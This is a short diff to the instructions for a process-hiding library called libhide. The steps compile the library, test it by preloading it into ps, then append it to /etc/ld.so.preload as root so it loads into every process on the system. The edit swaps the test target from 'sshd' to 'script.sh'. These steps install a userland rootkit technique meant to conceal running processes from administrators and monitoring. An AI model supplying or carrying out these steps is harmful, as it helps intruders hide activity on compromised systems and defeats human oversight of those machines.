@@ -9,7 +9,7 @@ If you choose hide by PID, simply enter the PID. If you choose hide by process n
 sudo gcc -fPIC -shared -w libhide.c -o /usr/local/lib/libhide.so
 
 <h4>Test first and make sure it's working using LD_PRELOAD. For example</h4>
-LD_PRELOAD=/usr/local/lib/libhide.so ps -x | grep sshd
+LD_PRELOAD=/usr/local/lib/libhide.so ps -x | grep script.sh
 
 <h4>If it's working correctly, switch to root (sudo su) and type</h4>
 echo /usr/local/lib/libhide.so >> /etc/ld.so.preload
